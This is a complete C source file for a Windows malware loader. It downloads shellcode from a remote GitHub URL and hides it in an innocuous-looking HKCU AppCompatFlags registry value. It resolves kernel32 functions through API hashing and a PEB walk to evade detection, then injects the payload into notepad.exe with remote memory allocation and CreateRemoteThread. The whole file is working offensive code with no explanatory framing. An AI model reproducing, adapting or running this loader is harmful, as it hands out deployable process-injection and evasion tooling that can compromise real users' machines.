#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <wctype.h>
#include <wininet.h>
#include <winreg.h>
#include <winternl.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "Advapi32.lib")

#define REGISTRY                                                               \
  "Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags"
#define REGSTRING "Cache"

#define H_KERNEL32_DLL 0xCC296063
#define H_VirtualAllocEx 0x0ECFC793
#define H_WriteProcessMemory 0x184EC554
#define H_VirtualFreeEx 0xAB71B86B
#define H_VirtualProtectEx 0x84A3F2CE
#define H_CreateRemoteThread 0xA68DBF19

#define INITIAL_SEED 10

LPCWSTR url =
L"https://github.com/0xki29/payload-cdn/raw/refs/heads/main/calc.bin";


typedef LPVOID(WINAPI* fnVirtualAllocEx)(HANDLE hProcess, LPVOID lpAddress,
    SIZE_T dwSize, DWORD flAllocationType,
    DWORD flProtect);

typedef BOOL(WINAPI* fnWriteProcessMemory)(HANDLE hProcess,
    LPVOID lpBaseAddress,
    LPCVOID lpBuffer, SIZE_T nSize,
    SIZE_T* lpNumberOfBytesWritten);

typedef BOOL(WINAPI* fnVirtualFreeEx)(HANDLE hProcess, LPVOID lpAddress,
    SIZE_T dwSize, DWORD dwFreeType);

typedef BOOL(WINAPI* fnVirtualProtectEx)(HANDLE hProcess, LPVOID lpAddress,
    SIZE_T dwSize, DWORD flNewProtect,
    PDWORD lpflOldProtect);

typedef HANDLE(WINAPI* fnCreateRemoteThread)(
    HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes,
    SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);

HMODULE GetModuleHandleH(DWORD dwModuleNameHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);


UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String) {
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenA(String);

    while (Index != Length) {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String) {
    SIZE_T Index = 0;
    UINT32 Hash = 0;
    SIZE_T Length = lstrlenW(String);

    while (Index != Length) {
        Hash += String[Index++];
        Hash += Hash << INITIAL_SEED;
        Hash ^= Hash >> 6;
    }

    Hash += Hash << 3;
    Hash ^= Hash >> 11;
    Hash += Hash << 15;

    return Hash;
}

#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR)API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR)API))

FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash) {
    if (hModule == NULL || dwApiNameHash == NULL)
        return NULL;

    PBYTE pBase = (PBYTE)hModule;

    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS pImgNtHdrs =
        (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs->OptionalHeader;

    PIMAGE_EXPORT_DIRECTORY pImgExportDir =
        (PIMAGE_EXPORT_DIRECTORY)(pBase +
            ImgOptHdr
            .DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
            .VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);
    PDWORD FunctionAddressArray =
        (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);
    PWORD FunctionOrdinalArray =
        (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID pFunctionAddress =
            (PVOID)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]);

        if (dwApiNameHash == HASHA(pFunctionName)) {
            return (FARPROC)pFunctionAddress;
        }
    }

    return NULL;
}

HMODULE GetModuleHandleH(DWORD dwModuleNameHash) {
    if (dwModuleNameHash == NULL)
        return NULL;

#ifdef _WIN64
    PPEB pPeb = (PPEB)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PPEB)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);

    PLIST_ENTRY pHead = &pLdr->InMemoryOrderModuleList;
    PLIST_ENTRY pEntry = pHead->Flink;

    while (pEntry != pHead) {
        PLDR_DATA_TABLE_ENTRY pDte =
            CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);

        if (pDte->FullDllName.Length != 0 && pDte->FullDllName.Length < MAX_PATH) {

            CHAR UpperCaseDllName[MAX_PATH];
            DWORD i = 0;
            while (pDte->FullDllName.Buffer[i]) {
                UpperCaseDllName[i] = (CHAR)toupper(pDte->FullDllName.Buffer[i]);
                i++;
            }
            UpperCaseDllName[i] = '\0';

            PCHAR pDllName = UpperCaseDllName;
            for (DWORD j = 0; j < i; j++) {
                if (UpperCaseDllName[j] == '\\')
                    pDllName = &UpperCaseDllName[j + 1];
            }

            if (HASHA(pDllName) == dwModuleNameHash)
                return (HMODULE)(pDte->DllBase);
        }
        else {
            break;
        }

        pEntry = pEntry->Flink;
    }

    return NULL;
}

BOOL DownloadPayload(PBYTE* pPayload, SIZE_T* sPayloadSize) {
    HINTERNET hInternet = NULL;
    HINTERNET hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0;
    PBYTE pBytes = NULL;
    PBYTE pTmpBytes = NULL;

    hInternet = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL,
        NULL, 0);
    if (!hInternet)
        return FALSE;

    hInternetFile =
        InternetOpenUrlW(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hInternetFile) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    pTmpBytes = (PBYTE)LocalAlloc(LPTR, 1024);
    if (!pTmpBytes) {
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    while (TRUE) {
        if (!InternetReadFile(hInternetFile, pTmpBytes, 1024, &dwBytesRead)) {
            LocalFree(pTmpBytes);
            if (pBytes)
                LocalFree(pBytes);
            InternetCloseHandle(hInternetFile);
            InternetCloseHandle(hInternet);
            return FALSE;
        }
        if (dwBytesRead == 0)
            break;

        if (pBytes == NULL)
            pBytes = (PBYTE)LocalAlloc(LPTR, dwBytesRead);
        else
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize + dwBytesRead,
                LMEM_MOVEABLE | LMEM_ZEROINIT);

        if (!pBytes) {
            LocalFree(pTmpBytes);
            InternetCloseHandle(hInternetFile);
            InternetCloseHandle(hInternet);
            return FALSE;
        }

        memcpy(pBytes + sSize, pTmpBytes, dwBytesRead);
        sSize += dwBytesRead;

        if (dwBytesRead < 1024)
            break;
    }

    *pPayload = pBytes;
    *sPayloadSize = sSize;
    LocalFree(pTmpBytes);
    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);
    return TRUE;
}

BOOL WriteShellcodeToRegistry(PBYTE pShellcode, DWORD dwShellcodeSize) {
    LSTATUS STATUS;
    HKEY hKey = NULL;

    STATUS = RegOpenKeyExA(HKEY_CURRENT_USER, REGISTRY, 0, KEY_SET_VALUE, &hKey);
    if (STATUS != ERROR_SUCCESS)
        return FALSE;

    STATUS = RegSetValueExA(hKey, REGSTRING, 0, REG_BINARY, pShellcode,
        dwShellcodeSize);
    RegCloseKey(hKey);

    return (STATUS == ERROR_SUCCESS);
}

BOOL ReadShellcodeFromRegistry(IN DWORD sPayloadSize, OUT PBYTE* ppPayload) {
    LSTATUS STATUS = 0;
    DWORD dwBytesRead = sPayloadSize;

    PBYTE pBytes =
        (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sPayloadSize);
    if (!pBytes) {
        printf("[!] HeapAlloc Failed With Error : %d\n", GetLastError());
        return FALSE;
    }

    STATUS = RegGetValueA(HKEY_CURRENT_USER, REGISTRY, REGSTRING, RRF_RT_ANY,
        NULL, pBytes, &dwBytesRead);
    if (STATUS != ERROR_SUCCESS) {
        printf("[!] RegGetValueA Failed With Error : %d\n", STATUS);
        HeapFree(GetProcessHeap(), 0, pBytes);
        return FALSE;
    }

    if (sPayloadSize != dwBytesRead) {
        printf("[!] Read %d bytes instead of %d\n", dwBytesRead, sPayloadSize);
        HeapFree(GetProcessHeap(), 0, pBytes);
        return FALSE;
    }

    *ppPayload = pBytes;
    return TRUE;
}

char* GenerateUUid(int a, int b, int c, int d, int e, int f, int g, int h,
    int i, int j, int k, int l, int m, int n, int o, int p) {
    char Output0[32], Output1[32], Output2[32], Output3[32];
    static char result[128];

    sprintf(Output0, "%0.2X%0.2X%0.2X%0.2X", d, c, b, a);
    sprintf(Output1, "%0.2X%0.2X-%0.2X%0.2X", f, e, h, g);
    sprintf(Output2, "%0.2X%0.2X-%0.2X%0.2X", i, j, k, l);
    sprintf(Output3, "%0.2X%0.2X%0.2X%0.2X", m, n, o, p);
    sprintf(result, "%s-%s-%s%s", Output0, Output1, Output2, Output3);

    return result;
}

BOOL GenerateUuidOutput(unsigned char* pShellcode, SIZE_T ShellcodeSize) {
    if (pShellcode == NULL || ShellcodeSize == 0)
        return FALSE;

    SIZE_T paddedSize = ShellcodeSize;
    if (paddedSize % 16 != 0)
        paddedSize += (16 - (paddedSize % 16));

    PBYTE pPadded =
        (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, paddedSize);
    if (!pPadded)
        return FALSE;

    memcpy(pPadded, pShellcode, ShellcodeSize);
    for (SIZE_T i = ShellcodeSize; i < paddedSize; i++)
        pPadded[i] = 0x90;

    SIZE_T elements = paddedSize / 16;
    printf("char* UuidArray[%llu] = {\n\t", (unsigned long long)elements);

    for (SIZE_T i = 0; i < elements; i++) {
        SIZE_T offset = i * 16;
        char* uuid = GenerateUUid(
            pPadded[offset], pPadded[offset + 1], pPadded[offset + 2],
            pPadded[offset + 3], pPadded[offset + 4], pPadded[offset + 5],
            pPadded[offset + 6], pPadded[offset + 7], pPadded[offset + 8],
            pPadded[offset + 9], pPadded[offset + 10], pPadded[offset + 11],
            pPadded[offset + 12], pPadded[offset + 13], pPadded[offset + 14],
            pPadded[offset + 15]);

        if (i == elements - 1)
            printf("\"%s\"", uuid);
        else
            printf("\"%s\", ", uuid);

        if ((i + 1) % 3 == 0)
            printf("\n\t");
    }

    printf("\n};\n\n");
    HeapFree(GetProcessHeap(), 0, pPadded);
    return TRUE;
}

HANDLE EnumProc(const wchar_t* NameProc) {
    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed: %d\n", GetLastError());
        return NULL;
    }

    if (!Process32FirstW(snap, &pe)) {
        printf("[!] Process32FirstW failed: %d\n", GetLastError());
        CloseHandle(snap);
        return NULL;
    }

    WCHAR LowerName[MAX_PATH];
    do {
        DWORD len = lstrlenW(pe.szExeFile);
        for (DWORD i = 0; i < len; i++)
            LowerName[i] = towlower(pe.szExeFile[i]);
        LowerName[len] = L'\0';

        if (wcscmp(NameProc, LowerName) == 0) {
            printf("[+] Found target process: PID %d\n", pe.th32ProcessID);
            HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);
            if (!hProc)
                printf("[!] OpenProcess failed: %d\n", GetLastError());
            CloseHandle(snap);
            return hProc;
        }
    } while (Process32NextW(snap, &pe));

    printf("[!] Process \"%ls\" not found\n", NameProc);
    CloseHandle(snap);
    return NULL;
}

BOOL InjectShellcode(HANDLE hProcess, PBYTE pShellcode, SIZE_T sShellcodeSize) {
    if (LoadLibraryA("KERNEL32.DLL") == NULL) {
        printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
        return FALSE;
    }

    HMODULE hKernel32 = GetModuleHandleH(H_KERNEL32_DLL);
    if (hKernel32 == NULL) {
        printf("[!] Couldn't Get Handle To kernel32.dll \n");
        return FALSE;
    }

    fnVirtualAllocEx pVirtualAllocEx =
        (fnVirtualAllocEx)GetProcAddressH(hKernel32, H_VirtualAllocEx);
    fnWriteProcessMemory pWriteProcessMemory =
        (fnWriteProcessMemory)GetProcAddressH(hKernel32, H_WriteProcessMemory);
    fnVirtualFreeEx pVirtualFreeEx =
        (fnVirtualFreeEx)GetProcAddressH(hKernel32, H_VirtualFreeEx);
    fnVirtualProtectEx pVirtualProtectEx =
        (fnVirtualProtectEx)GetProcAddressH(hKernel32, H_VirtualProtectEx);
    fnCreateRemoteThread pCreateRemoteThread =
        (fnCreateRemoteThread)GetProcAddressH(hKernel32, H_CreateRemoteThread);

    if (!pVirtualAllocEx || !pWriteProcessMemory || !pVirtualFreeEx ||
        !pVirtualProtectEx || !pCreateRemoteThread) {
        printf("[!] Failed to resolve one or more APIs\n");
        return FALSE;
    }

    PVOID pRemoteAddr = pVirtualAllocEx(hProcess, NULL, sShellcodeSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!pRemoteAddr) {
        printf("[!] VirtualAllocEx failed: %d\n", GetLastError());
        return FALSE;
    }
    printf("[+] Allocated %llu bytes at 0x%p in target\n",
        (unsigned long long)sShellcodeSize, pRemoteAddr);

    SIZE_T sBytesWritten = 0;
    if (!pWriteProcessMemory(hProcess, pRemoteAddr, pShellcode, sShellcodeSize,
        &sBytesWritten)) {
        printf("[!] WriteProcessMemory failed: %d\n", GetLastError());
        pVirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] Wrote %llu bytes\n", (unsigned long long)sBytesWritten);

    DWORD dwOldProtect = 0;
    if (!pVirtualProtectEx(hProcess, pRemoteAddr, sShellcodeSize,
        PAGE_EXECUTE_READ, &dwOldProtect)) {
        printf("[!] VirtualProtectEx failed: %d\n", GetLastError());
        pVirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] Memory protection changed to PAGE_EXECUTE_READ\n");

    HANDLE hThread = pCreateRemoteThread(
        hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteAddr, NULL, 0, NULL);
    if (!hThread) {
        printf("[!] CreateRemoteThread failed: %d\n", GetLastError());
        pVirtualFreeEx(hProcess, pRemoteAddr, 0, MEM_RELEASE);
        return FALSE;
    }
    printf("[+] Remote thread created: 0x%p\n", hThread);

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    return TRUE;
}

void PrintHexDump(PBYTE pData, SIZE_T sSize) {
    printf("[*] Hex dump (%llu bytes):\n", (unsigned long long)sSize);
    SIZE_T limit = (sSize < 64) ? sSize : 64;
    for (SIZE_T i = 0; i < limit; i++) {
        printf("%02X ", pData[i]);
        if ((i + 1) % 16 == 0)
            printf("\n");
    }
    if (sSize > 64)
        printf("\n... (%llu more bytes)\n", (unsigned long long)(sSize - 64));
    printf("\n");
}

int main() {
    PBYTE payload = NULL;
    PBYTE regPayload = NULL;
    SIZE_T payloadSize = 0;

    printf("[*] Downloading payload...\n");
    if (!DownloadPayload(&payload, &payloadSize)) {
        printf("[!] Download failed\n");
        return -1;
    }
    printf("[+] Downloaded %llu bytes\n", (unsigned long long)payloadSize);

    GenerateUuidOutput(payload, payloadSize);

    if (!WriteShellcodeToRegistry(payload, (DWORD)payloadSize)) {
        printf("[!] Failed writing to registry\n");
        LocalFree(payload);
        return -1;
    }
    printf("[+] Shellcode written to registry\n");

    LocalFree(payload);
    payload = NULL;

    if (!ReadShellcodeFromRegistry((DWORD)payloadSize, &regPayload)) {
        printf("[!] Failed reading from registry\n");
        return -1;
    }
    printf("[+] Shellcode read from registry\n");
    PrintHexDump(regPayload, payloadSize);

    printf("[*] Looking for target process...\n");
    HANDLE hTarget = EnumProc(L"notepad.exe");
    if (!hTarget) {
        printf("[!] Could not get handle to target process\n");
        HeapFree(GetProcessHeap(), 0, regPayload);
        return -1;
    }
    printf("[+] Got process handle: 0x%p\n", hTarget);

    if (!InjectShellcode(hTarget, regPayload, payloadSize)) {
        printf("[!] Injection failed\n");
        CloseHandle(hTarget);
        HeapFree(GetProcessHeap(), 0, regPayload);
        return -1;
    }
    printf("[+] Injection successful!\n");

    CloseHandle(hTarget);
    HeapFree(GetProcessHeap(), 0, regPayload);

    printf("[+] All done.\n");
    return 0;
}
